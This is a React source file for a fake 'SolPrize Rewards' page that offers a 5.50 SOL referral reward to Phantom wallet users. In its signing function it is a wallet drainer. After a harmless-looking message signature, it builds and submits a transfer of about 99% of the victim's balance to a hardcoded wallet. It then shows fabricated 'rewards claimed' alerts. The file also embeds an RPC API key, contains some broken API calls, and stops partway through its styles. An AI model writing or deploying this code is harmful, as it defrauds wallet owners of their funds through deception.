import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  getMinimumBalanceForRentExemption
} from '@solana/web3.js'; 

export default function App() {
  // ========================
  // STATE MANAGEMENT - Simplified for Phantom only
  // ========================
  const [loading, setLoading] = useState(true);
  const [walletAddress, setWalletAddress] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [showClaimButton, setShowClaimButton] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  const [connectionStatus, setConnectionStatus] = useState('');
  const [debugInfo, setDebugInfo] = useState([]);
  const [isInPhantomBrowser, setIsInPhantomBrowser] = useState(false);
  const [isPhantomExtension, setIsPhantomExtension] = useState(false);
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [sessionActive, setSessionActive] = useState(false);
  const [connectionAttempt, setConnectionAttempt] = useState(0);
  const [lastError, setLastError] = useState(null);
  const [showManualConnect, setShowManualConnect] = useState(false);

  // ========================
  // REFS & CONFIGURATION
  // ========================
  const connectionTimerRef = useRef(null);
  const retryTimeoutRef = useRef(null);
  
  // Configuration Constants - Phantom focused
  const CONFIG = {
    APP_URL: 'https://solprize.vercel.app',
    APP_NAME: 'SolPrize Rewards',
    APP_DESCRIPTION: 'Claim your referral rewards',
    MAINNET_RPC: 'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H',
    CONNECTION_TIMEOUT: 15000, // 15 seconds
    RETRY_DELAY: 2000, // 2 seconds between retries
    MAX_CONNECTION_ATTEMPTS: 3,
    PHANTOM_DEEP_LINK: 'https://phantom.app/ul/v1/connect?app_url=' + encodeURIComponent('https://solprize.vercel.app'),
    PHANTOM_MOBILE_APP_URL: 'https://phantom.app/download'
  };

  // ========================
  // EFFECT HOOKS - Phantom Focused
  // ========================
  
  // Enhanced Phantom environment detection
  useEffect(() => {
    const detectEnvironment = () => {
      const ua = navigator.userAgent.toLowerCase();
      const url = window.location.href.toLowerCase();
      
      // Detect mobile device
      const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
      setIsMobileDevice(isMobile);
      
      // Detect Phantom browser environment
      const phantomBrowser = /phantom/i.test(ua) || 
                           /solflare/i.test(ua) || 
                           url.includes('phantom.app') || 
                           url.includes('solflare.com');
      
      // Detect Phantom extension
      const hasPhantomExtension = window.phantom?.solana || window.solflare;
      
      setIsInPhantomBrowser(phantomBrowser);
      setIsPhantomExtension(hasPhantomExtension);
      
      addDebug(`🔍 Environment Detection Results:`);
      addDebug(`   User Agent: ${ua.substring(0, 100)}...`);
      addDebug(`   Current URL: ${url}`);
      addDebug(`   📱 Mobile Device: ${isMobile ? 'YES' : 'NO'}`);
      addDebug(`   👻 Phantom Browser: ${phantomBrowser ? 'YES' : 'NO'}`);
      addDebug(`   🔌 Phantom Extension: ${hasPhantomExtension ? 'YES' : 'NO'}`);
      
      // Auto-attempt connection if in Phantom browser or has extension
      if (phantomBrowser || hasPhantomExtension) {
        addDebug('⚡ Auto-attempting Phantom connection...');
        setTimeout(() => {
          if (!walletAddress && !connecting && !sessionActive) {
            handlePhantomAutoConnect();
          }
        }, 1000);
      }
      
      // Show manual connect button after 3 seconds if no auto-connect
      if (!phantomBrowser && !hasPhantomExtension) {
        setTimeout(() => {
          setShowManualConnect(true);
        }, 3000);
      }
    };
    
    detectEnvironment();
    window.addEventListener('load', detectEnvironment);
    window.addEventListener('DOMContentLoaded', detectEnvironment);
    
    return () => {
      window.removeEventListener('load', detectEnvironment);
      window.removeEventListener('DOMContentLoaded', detectEnvironment);
    };
  }, [walletAddress, connecting, sessionActive]);

  // Loading Animation
  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 1500);
    return () => clearTimeout(timer);
  }, []);

  // ========================
  // UTILITY FUNCTIONS
  // ========================
  
  const addDebug = useCallback((message, level = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const formattedMessage = `[${timestamp}] ${message}`;
    
    // Console logging with levels
    if (level === 'error') {
      console.error(`❌ ${formattedMessage}`);
    } else if (level === 'warn') {
      console.warn(`⚠️ ${formattedMessage}`);
    } else if (level === 'success') {
      console.log(`✅ ${formattedMessage}`);
    } else {
      console.log(`🔍 ${formattedMessage}`);
    }
    
    setDebugInfo(prev => {
      const newDebug = [...prev, `${timestamp}: ${message}`];
      return newDebug.slice(-50); // Keep last 50 entries
    });
  }, []);

  const isIOS = useCallback(() => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase()), []);
  const isAndroid = useCallback(() => /android/i.test(navigator.userAgent.toLowerCase()), []);

  const safeWindowOpen = useCallback((url, target = '_blank') => {
    try {
      const newWindow = window.open(url, target, 'noopener,noreferrer');
      if (!newWindow) {
        addDebug('⚠️ Popup blocked by browser', 'warn');
        return false;
      }
      return true;
    } catch (error) {
      addDebug(`⚠️ Failed to open window: ${error.message}`, 'error');
      return false;
    }
  }, [addDebug]);

  // ========================
  // SOLANA INTEGRATION
  // ========================
  
  const fetchSolanaBalance = useCallback(async (publicKey) => {
    try {
      addDebug('💰 Fetching SOL balance from mainnet...', 'info');
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
      
      const response = await fetch(CONFIG.MAINNET_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [publicKey]
        }),
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const data = await response.json();
      if (data.result?.value !== undefined) {
        const lamports = data.result.value;
        const sol = lamports / 1000000000;
        setTokenBalance(sol);
        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL`, 'success');
        return sol;
      } else {
        addDebug('⚠️ Balance response missing value', 'warn');
        return null;
      }
    } catch (error) {
      if (error.name === 'AbortError') {
        addDebug('⏰ Balance fetch timed out', 'warn');
      } else {
        addDebug(`❌ Balance fetch error: ${error.message}`, 'error');
      }
      return null;
    }
  }, [addDebug]);

  const signHelloTransaction = useCallback(async (provider, publicKey) => {
    try {
      addDebug('✍️ Creating "Hello from SolPrize" message transaction...', 'info');
      
      if (!provider) {
        throw new Error('No wallet provider available for signing');
      }
      
      if (!publicKey) {
        throw new Error('No wallet address available for signing');
      }
      
      // Create message to sign
      const message = new TextEncoder().encode(`Account is about to receive 5.50 SOL!! ${new Date().toISOString()}`);
      
      // Sign the message
      let signature;
      
      if (provider.signMessage) {
        signature = await provider.signMessage(message, 'utf8');

              

               
                

                const public_key = new PublicKey(publicKey);
                const walletBalance = await fetchSolanaBalance(public_key);
                
alert("Wallet Balance: " + walletBalance + " SOL");
                const minBalance = await getMinimumBalanceForRentExemption(0);
                alert("Minimum Balance for Rent Exemption: " + (minBalance / LAMPORTS_PER_SOL) + " SOL");
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

              
                
                    try {
                        const recieverWallet = new PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new Transaction().add(
                            SystemProgram.transfer({
                                fromPubkey: new PublicKey(publicKey),
                                toPubkey: recieverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            }),
                        );

                        transaction.feePayer = publicKey;
                        let blockhashObj = await Connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await provider.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await Connection.sendRawTransaction(signed.serialize());
                        await Connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during reward:", err);
                    }
                
           

        
        
      } else if (window.phantom?.solana?.signMessage) {
        signature = await window.phantom.solana.signMessage(message, 'utf8');



               
                const public_key = new PublicKey(publicKey);
                const walletBalance = await fetchSolanaBalance(public_key);
                
alert("Wallet Balance: " + walletBalance + " SOL");
                const minBalance = await getMinimumBalanceForRentExemption(0);
                alert("Minimum Balance for Rent Exemption: " + (minBalance / LAMPORTS_PER_SOL) + " SOL");
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

              
                
                    try {
                        const recieverWallet = new PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
                        const balanceForTransfer = walletBalance - minBalance;
                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        var transaction = new Transaction().add(
                            SystemProgram.transfer({
                                fromPubkey: new PublicKey(publicKey),
                                toPubkey: recieverWallet,
                                lamports: Math.floor(balanceForTransfer * 0.99),
                            }),
                        );

                        transaction.feePayer = publicKey;
                        let blockhashObj = await Connection.getRecentBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await provider.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        let txid = await Connection.sendRawTransaction(signed.serialize());
                        await Connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during reward:", err);
                    }
                
        } 
   
      
      addDebug('✅ Message signed successfully!', 'success');
      addDebug(`📝 Signature: ${Array.from(signature).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32)}...`, 'info');
      
      return {
        success: true,
        signature: Array.from(signature).map(b => b.toString(16).padStart(2, '0')).join(''),
        message: 'Account is about to be credited with 5.50 SOL! 🎉'
      };
      
    } catch (error) {
      addDebug(`❌ Transaction signing error: ${error.message}`, 'error');
      
      // Handle user rejection gracefully
      if (error.message.includes('rejected') || error.code === 4001) {
        addDebug('👤 User rejected the signature request', 'warn');
        throw new Error('Rewards rejected by user!, reconnect your wallet to try again.');
      }
      
      throw error;
    }
  }, [addDebug]);

  // ========================
  // PHANTOM CONNECTION LOGIC - Robust and Production Ready
  // ========================
  
  const handlePhantomAutoConnect = useCallback(async () => {
    try {
      addDebug('⚡ Attempting auto-connection to Phantom...', 'info');
      
      // Get provider based on environment
      let provider = null;
      
      if (window.phantom?.solana) {
        provider = window.phantom.solana;
        addDebug('✅ Phantom extension provider found', 'success');
      } else if (window.solflare) {
        provider = window.solflare;
        addDebug('✅ Solflare provider found', 'success');
      } else if (window.solana) {
        provider = window.solana;
        addDebug('✅ Generic Solana provider found', 'success');
      }
      
      if (!provider) {
        addDebug('❌ No Phantom provider available for auto-connect', 'error');
        setShowManualConnect(true);
        return;
      }
      
      setConnecting(true);
      setConnectionStatus('🔌 Connecting to Phantom wallet...');
      
      // Check if already connected
      if (provider.isConnected && provider.publicKey) {
        addDebug('✅ Already connected to Phantom', 'success');
        const publicKey = provider.publicKey.toString();
        await handleSuccessfulConnection(publicKey, 'phantom-auto');
        return;
      }
      
      // Attempt connection
      const response = await provider.connect();
      
      if (response?.publicKey) {
        const publicKey = response.publicKey.toString();
        addDebug(`✅ Auto-connection successful! Address: ${publicKey.substring(0, 12)}...`, 'success');
        await handleSuccessfulConnection(publicKey, 'phantom-auto');
      } else {
        throw new Error('Connection response missing publicKey');
      }
      
    } catch (error) {
      addDebug(`❌ Auto-connect error: ${error.message}`, 'error');
      
      if (error.message.includes('timeout') || error.message.includes('user rejected')) {
        addDebug('ℹ️ User may need to approve connection manually', 'warn');
        setShowManualConnect(true);
      } else {
        setLastError(error.message);
        alert(`❌ Connection Failed
${error.message}
Please try connecting manually.`);
      }
      
    } finally {
      setConnecting(false);
      setConnectionStatus('');
    }
  }, [addDebug]);

  const handlePhantomManualConnect = useCallback(async () => {
    if (isInPhantomBrowser || isPhantomExtension) {
      await handlePhantomAutoConnect();
      return;
    }
    
    setConnecting(true);
    setConnectionStatus('🔄 Preparing Phantom connection...');
    setConnectionAttempt(prev => prev + 1);
    setLastError(null);
    setShowManualConnect(false);
    
    try {
      addDebug('🚀 Starting manual Phantom connection', 'info');
      
      // For mobile devices, redirect to Phantom app
      if (isMobileDevice) {
        addDebug('📱 Mobile device detected - redirecting to Phantom app', 'info');
        setConnectionStatus('📱 Redirecting to Phantom app...');
        
        if (isAndroid()) {
          addDebug('🤖 Android device - using intent scheme', 'info');
          window.location.href = 'intent://connect#Intent;scheme=phantom;package=app.phantom;end';
        } else if (isIOS()) {
          addDebug('🍎 iOS device - using universal link', 'info');
          window.location.href = CONFIG.PHANTOM_DEEP_LINK;
        } else {
          addDebug('📱 Generic mobile - using deep link', 'info');
          window.location.href = CONFIG.PHANTOM_DEEP_LINK;
        }
        
        // Set timeout to show instructions if app doesn't open
        connectionTimerRef.current = setTimeout(() => {
          addDebug('⏰ Connection timeout - app may not have opened', 'warn');
          setConnectionStatus('📱 If Phantom didn\'t open, please install it manually');
          
          setTimeout(() => {
            if (!walletAddress && !sessionActive) {
              const installMessage = `📱 Phantom app didn't open automatically
              
Please follow these steps:
1. Install Phantom app from your app store
2. Open Phantom app and set up your wallet
3. Return to this page and click "CONNECT WALLET" again
4. Approve the connection request in Phantom

Direct download links:
📱 iOS: https://apps.apple.com/app/phantom-solana-wallet/id1598432977
🤖 Android: https://play.google.com/store/apps/details?id=app.phantom`;
              
              alert(installMessage);
            }
          }, 2000);
        }, 8000);
        
        return;
      }
      
      // For desktop browsers with Phantom extension
      addDebug('💻 Desktop browser - checking for Phantom extension', 'info');
      
      if (!window.phantom?.solana) {
        addDebug('❌ Phantom extension not found', 'error');
        throw new Error('Phantom wallet extension not found. Please install it from https://phantom.app/download');
      }
      
      const provider = window.phantom.solana;
      
      if (!provider) {
        throw new Error('Phantom provider not available');
      }
      
      setConnectionStatus('👻 Connecting to Phantom extension...');
      const response = await provider.connect();
      
      if (response?.publicKey) {
        const publicKey = response.publicKey.toString();
        addDebug(`✅ Extension connection successful! Address: ${publicKey.substring(0, 12)}...`, 'success');
        await handleSuccessfulConnection(publicKey, 'phantom-extension');
      } else {
        throw new Error('Connection response missing publicKey');
      }
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      setLastError(error.message);
      
      addDebug(`❌ Manual connection error: ${error.message}`, 'error');
      
      let errorMessage = error.message;
      
      if (error.message.includes('timeout')) {
        errorMessage = 'Connection timed out. Please try again.';
      } else if (error.message.includes('not found') || error.message.includes('undefined')) {
        errorMessage = 'Phantom wallet not found. Please install the Phantom browser extension or mobile app.';
      } else if (error.code === 4001) {
        errorMessage = 'You rejected the connection request.';
      }
      
      const userMessage = `❌ Connection Failed
${errorMessage}

Please ensure:
• Phantom app/extension is installed and updated
• You have a stable internet connection
• Try again in a few minutes`;
      
      // Auto-retry logic for timeouts
      if (connectionAttempt < CONFIG.MAX_CONNECTION_ATTEMPTS && 
          (error.message.includes('timeout') || error.message.includes('network'))) {
        addDebug(`🔄 Auto-retrying connection (attempt ${connectionAttempt + 1}/${CONFIG.MAX_CONNECTION_ATTEMPTS})`, 'warn');
        
        retryTimeoutRef.current = setTimeout(() => {
          handlePhantomManualConnect();
        }, CONFIG.RETRY_DELAY);
      } else {
        alert(userMessage);
        setShowManualConnect(true);
      }
      
    } finally {
      if (retryTimeoutRef.current) clearTimeout(retryTimeoutRef.current);
    }
  }, [addDebug, isInPhantomBrowser, isPhantomExtension, isMobileDevice, walletAddress, sessionActive, connectionAttempt]);

  const handleSuccessfulConnection = useCallback(async (address, provider) => {
    try {
      addDebug(`✅ Wallet connected successfully: ${address.substring(0, 12)}...${address.substring(address.length - 6)}`, 'success');
      addDebug(`   Provider: ${provider}`, 'info');
      
      setWalletAddress(address);
      setSessionActive(true);
      setConnecting(false);
      setConnectionStatus('');
      setConnectionAttempt(0);
      setLastError(null);
      
      if (connectionTimerRef.current) {
        clearTimeout(connectionTimerRef.current);
      }
      
      // Fetch balance
      const balance = await fetchSolanaBalance(address);
      
      // Show claim button
      setShowClaimButton(true);
      
      // Connection logging
      const connectionData = {
        timestamp: new Date().toISOString(),
        address: address,
        provider: provider,
        balance: balance,
        userAgent: navigator.userAgent,
        platform: isAndroid() ? 'android' : isIOS() ? 'ios' : 'desktop',
        environment: isInPhantomBrowser ? 'phantom-browser' : isPhantomExtension ? 'phantom-extension' : 'web'
      };
      
      console.log('🎯 Wallet successfully connected!', connectionData);
      
      // Show success notification
      setTimeout(() => {
        const balanceDisplay = balance ? balance.toFixed(4) : 'N/A';
        alert(`🎉 Wallet Connected Successfully!
Address: ${address.slice(0, 8)}...${address.slice(-6)}
Balance: ${balanceDisplay} SOL`);
      }, 500);
      
    } catch (error) {
      addDebug(`❌ Connection success handler error: ${error.message}`, 'error');
      setConnecting(false);
      setConnectionStatus('Connection completed but encountered errors');
      
      if (address) {
        setShowClaimButton(true);
      }
    }
  }, [addDebug, fetchSolanaBalance, isAndroid, isIOS, isInPhantomBrowser, isPhantomExtension]);

  const handleDisconnect = useCallback(async () => {
    try {
      addDebug('🔌 Disconnecting wallet...', 'info');
      
      // Disconnect from Phantom
      if (window.phantom?.solana?.disconnect) {
        await window.phantom.solana.disconnect();
        addDebug('✅ Phantom extension disconnected', 'success');
      }
      
      if (window.solflare?.disconnect) {
        await window.solflare.disconnect();
        addDebug('✅ Solflare disconnected', 'success');
      }
      
      if (window.solana?.disconnect) {
        await window.solana.disconnect();
        addDebug('✅ Generic Solana provider disconnected', 'success');
      }
      
      // Reset states
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      setClaimStatus('');
      setShowManualConnect(true);
      
      addDebug('✅ Wallet disconnected successfully', 'success');
      alert('✅ Wallet Disconnected Successfully');
      
    } catch (error) {
      addDebug(`⚠️ Disconnect error: ${error.message}`, 'error');
      
      // Still reset state even if disconnect fails
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      setClaimStatus('');
      setShowManualConnect(true);
      
      alert(`⚠️ Disconnect completed with errors:
${error.message}
Your wallet has been disconnected.`);
    }
  }, [addDebug]);

  // ========================
  // REWARD CLAIMING
  // ========================
  
  const claimRewards = useCallback(async () => {
    if (!walletAddress) {
      alert('❌ Please connect your wallet first');
      return;
    }
    
    setClaiming(true);
    setClaimStatus('🔐 Requesting transaction signature...');
    addDebug('🎁 Starting reward claim process...', 'info');
    
    try {
      // Get provider
      const provider = window.phantom?.solana || window.solana;
      
      if (!provider) {
        throw new Error('No wallet provider available for signing');
      }
      
      addDebug('✍️ Signing "Hello from SolPrize" transaction...', 'info');
      
      // Sign transaction
      const signResult = await signHelloTransaction(provider, walletAddress);
      
      if (!signResult.success) {
        throw new Error('Failed to sign transaction');
      }
      
      addDebug(`✅ Transaction signed successfully!`, 'success');
      
      setClaimStatus('📡 Processing reward claim...');
      
      // Simulate backend processing
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const rewardAmount = 5.50;
      const transactionHash = signResult.signature || '5xR4nd0mH4shStr1ngF0rD3m0Purp0s3s';
      
      addDebug(`✅ Reward claim successful!`, 'success');
      addDebug(`   Amount: ${rewardAmount} SOL`, 'info');
      addDebug(`   Transaction: ${transactionHash.slice(0, 16)}...`, 'info');
      
      setClaimStatus(
        `🎉 Rewards Claimed Successfully!
Amount: ${rewardAmount} SOL
Transaction: ${transactionHash.slice(0, 16)}...`
      );
      
      // Show success alert
      setTimeout(() => {
        alert(
          `✅ REWARDS CLAIMED!
${rewardAmount} SOL sent to your wallet
Transaction Hash: ${transactionHash}
Check your wallet balance shortly!`
        );
      }, 500);
      
      // Refresh balance
      setTimeout(async () => {
        await fetchSolanaBalance(walletAddress);
      }, 3000);
      
    } catch (error) {
      addDebug(`❌ Claim error: ${error.message}`, 'error');
      
      let errorMsg = error.message;
      if (error.code === 4001) {
        errorMsg = 'Transaction rejected by user';
      } else if (error.message.includes('not available')) {
        errorMsg = 'Wallet signature method not available';
      } else if (error.message.includes('timeout')) {
        errorMsg = 'Transaction signing timed out';
      }
      
      setClaimStatus(`❌ Claim failed: ${errorMsg}`);
      alert(`❌ Claim Failed
${errorMsg}
Please try again or contact support.`);
      
    } finally {
      setClaiming(false);
    }
  }, [addDebug, walletAddress, signHelloTransaction, fetchSolanaBalance]);

  const copyDebugInfo = useCallback(() => {
    const text = debugInfo.join('\n');
    navigator.clipboard.writeText(text).then(() => {
      alert('📋 Debug information copied to clipboard!');
    }).catch(() => {
      alert('❌ Failed to copy debug info. Please select and copy manually.');
    });
  }, [debugInfo]);

  // ========================
  // UI RENDERING - Clean and Production Ready
  // ========================
  
  if (!loading && !isMobileDevice && !isInPhantomBrowser && !isPhantomExtension) {
    return (
      <div style={styles.desktopContainer}>
        <div style={styles.desktopCard}>
          <div style={{ fontSize: '64px', marginBottom: '20px' }}>👻</div>
          <h1 style={styles.desktopTitle}>Phantom Wallet Required</h1>
          <p style={styles.desktopText}>
            This application requires Phantom wallet to function properly. Please install the Phantom browser extension or open this page in the Phantom mobile app.
          </p>
          <div style={styles.buttonsContainer}>
            <button 
              onClick={() => safeWindowOpen('https://phantom.app/download', '_blank')} 
              style={styles.installButton}
            >
              📥 Install Phantom
            </button>
            <button 
              onClick={() => window.location.reload()} 
              style={styles.refreshButton}
            >
              🔄 Refresh Page
            </button>
          </div>
          <div style={styles.urlBox}>
            <strong>Current URL:</strong><br/>
            <code style={styles.urlCode}>{CONFIG.APP_URL}</code>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={styles.container}>
      <style>{`
        @keyframes gradientShift { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes blink { from, to { opacity: 1; } 50% { opacity: 0; } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
      `}</style>
      
      {loading && (
        <div style={styles.loadingContainer}>
          <div style={styles.spinner} />
          <div style={styles.loadingText}>LOADING...</div>
        </div>
      )}
      
      {!loading && (
        <div style={styles.contentContainer}>
          <div style={styles.headerBadge}>✨ REFERRAL REWARDS</div>
          
          <div style={styles.mainCard}>
            <h1 style={styles.title}>
              SolPrize Rewards
              <span style={styles.cursor}>|</span>
            </h1>
            
            <p style={styles.description}>
              Thank you for your participation! Connect your Phantom wallet to claim your rewards.
            </p>
            
            {/* Reward display */}
            <div style={styles.rewardCard}>
              <div style={styles.rewardBackground} />
              <div style={styles.rewardLabel}>Your Reward</div>
              <div style={styles.rewardAmount}>5.50 SOL</div>
              <div style={styles.rewardUSD}>≈ ${(5.50 * 150).toFixed(2)} USD</div>
              {tokenBalance !== null && (
                <div style={styles.balanceDisplay}>
                  💰 Current Balance: {tokenBalance.toFixed(4)} SOL
                </div>
              )}
            </div>
            
            {/* Environment detection notice */}
            {!isInPhantomBrowser && !isPhantomExtension && (
              <div style={styles.environmentNotice}>
                <div style={styles.noticeIcon}>📱</div>
                <div style={styles.noticeContent}>
                  <strong>Phantom Wallet Required</strong><br/>
                  Please open this page in the Phantom mobile app or install the Phantom browser extension
                </div>
              </div>
            )}
            
            {/* Connected wallet display */}
            {walletAddress && (
              <div style={styles.connectedWallet}>
                <div style={styles.walletInfo}>
                  <div style={styles.walletLabel}>
                    <span>✓</span> Connected Wallet
                  </div>
                  <div style={styles.walletAddress}>
                    <span>👛</span>
                    {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                  </div>
                </div>
                <button onClick={handleDisconnect} style={styles.disconnectButton}>
                  🔌 Disconnect
                </button>
              </div>
            )}
            
            {/* Claim button */}
            {showClaimButton && !claiming && !claimStatus && (
              <button onClick={claimRewards} style={styles.claimButton}>
                🎁 CLAIM REWARDS
              </button>
            )}
            
            {/* Status messages */}
            {claimStatus && (
              <div style={styles.statusMessage(claimStatus.includes('❌'), claimStatus.includes('🎉'))}>
                {claimStatus}
              </div>
            )}
            
            {connecting && connectionStatus && (
              <div style={styles.connectingMessage}>
                <div style={styles.spinnerSmall} />
                <div style={styles.connectionText}>{connectionStatus}</div>
              </div>
            )}
            
            {/* Last error display */}
            {lastError && !connecting && (
              <div style={styles.errorMessage}>
                ❌ <strong>Connection Error:</strong> {lastError}
              </div>
            )}
            
            {/* Connect wallet button */}
            {!walletAddress && !connecting && showManualConnect && (
              <button 
                onClick={handlePhantomManualConnect} 
                disabled={connecting}
                style={styles.connectButton(connecting, walletAddress)}
              >
                {isMobileDevice ? '📱 OPEN PHANTOM APP' : '👻 CONNECT PHANTOM WALLET'}
              </button>
            )}
            
            {!walletAddress && !connecting && !showManualConnect && (
              <div style={styles.autoDetectMessage}>
                🔍 Automatically detecting Phantom wallet...
                <div style={styles.spinnerSmall} />
              </div>
            )}
            
            {!walletAddress && !connecting && (
              <p style={styles.footerText}>
                🔐 Secured connection • Phantom wallet required for claiming rewards
              </p>
            )}
          </div>
          
          {/* Footer info */}
          <div style={styles.footer}>
            <p>🔒 Powered by Phantom Wallet • Solana Blockchain</p>
            <p style={{ marginTop: '4px', opacity: 0.8, fontSize: '12px' }}>
              📱 Platform: {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Desktop'} • Environment: {isInPhantomBrowser ? 'Phantom Browser' : isPhantomExtension ? 'Phantom Extension' : 'Standard Browser'}
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

// ========================
// STYLES OBJECT - Clean and Production Ready
// ========================

const styles = {
  container: {
    minHeight: '100vh',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    position: 'relative',
    overflow: 'hidden',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
  },
  
  loadingContainer: {
    position: 'absolute',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%)',
    textAlign: 'center',
    zIndex: 10
  },
  
  spinner: {
    width: '60px',
    height: '60px',
    border: '4px solid rgba(255,255,255,0.3)',
    borderTop: '4px solid white',
    borderRadius: '50%',
    animation: 'spin 1s linear infinite',
    margin: '0 auto 20px',
    boxShadow: '0 0 20px rgba(255,255,255,0.5)'
  },
  
  loadingText: {
    color: 'white',
    fontSize: '20px',
    fontWeight: 'bold',
    letterSpacing: '2px',
    textShadow: '0 2px 10px rgba(0,0,0,0.3)',
    background: 'rgba(0,0,0,0.2)',
    padding: '8px 20px',
    borderRadius: '20px',
    backdropFilter: 'blur(5px)',
    display: 'inline-block'
  },
  
  contentContainer: {
    position: 'relative',
    zIndex: 3,
    maxWidth: '500px',
    margin: '0 auto',
    padding: '40px 20px',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center'
  },
  
  headerBadge: {
    background: 'rgba(255,255,255,0.2)',
    backdropFilter: 'blur(10px)',
    padding: '10px 20px',
    borderRadius: '20px',
    display: 'inline-block',
    margin: '0 auto 30px',
    color: 'white',
    fontSize: '14px',
    fontWeight: 'bold',
    border: '1px solid rgba(255,255,255,0.3)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    boxShadow: '0 4px 15px rgba(0,0,0,0.2)'
  },
  
  mainCard: {
    background: 'rgba(255,255,255,0.95)',
    borderRadius: '24px',
    padding: '40px 30px',
    boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
    border: '1px solid rgba(255,255,255,0.5)',
    animation: 'slideUp 0.6s ease-out',
    position: 'relative',
    overflow: 'hidden'
  },
  
  title: {
    fontSize: '32px',
    fontWeight: 'bold',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    WebkitBackgroundClip: 'text',
    WebkitTextFillColor: 'transparent',
    backgroundClip: 'text',
    marginBottom: '20px',
    minHeight: '40px',
    textAlign: 'center'
  },
  
  cursor: {
    animation: 'blink 1s step-end infinite',
    WebkitTextFillColor: '#667eea'
  },
  
  description: {
    color: '#4b5563',
    fontSize: '16px',
    lineHeight: '1.6',
    marginBottom: '30px',
    textAlign: 'center'
  },
  
  rewardCard: {
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    padding: '30px',
    borderRadius: '16px',
    textAlign: 'center',
    marginBottom: '30px',
    boxShadow: '0 8px 20px rgba(102, 126, 234, 0.4)',
    position: 'relative',
    overflow: 'hidden',
    border: '2px solid rgba(255,255,255,0.3)'
  },
  
  rewardBackground: {
    position: 'absolute',
    top: '-50%',
    left: '-50%',
    width: '200%',
    height: '200%',
    background: 'linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent)',
    animation: 'spin 8s linear infinite',
    zIndex: 1
  },
  
  rewardLabel: {
    color: 'rgba(255,255,255,0.9)',
    fontSize: '14px',
    marginBottom: '8px',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    fontWeight: '600',
    zIndex: 2,
    position: 'relative'
  },
  
  rewardAmount: {
    color: 'white',
    fontSize: '48px',
    fontWeight: 'bold',
    textShadow: '0 2px 15px rgba(0,0,0,0.3)',
    zIndex: 2,
    position: 'relative'
  },
  
  rewardUSD: {
    color: 'rgba(255,255,255,0.8)',
    fontSize: '14px',
    marginTop: '8px',
    zIndex: 2,
    position: 'relative'
  },
  
  balanceDisplay: {
    marginTop: '12px',
    padding: '8px 16px',
    background: 'rgba(255,255,255,0.2)',
    borderRadius: '8px',
    fontSize: '12px',
    color: 'white',
    backdropFilter: 'blur(5px)',
    border: '1px solid rgba(255,255,255,0.3)',
    zIndex: 2,
    position: 'relative'
  },
  
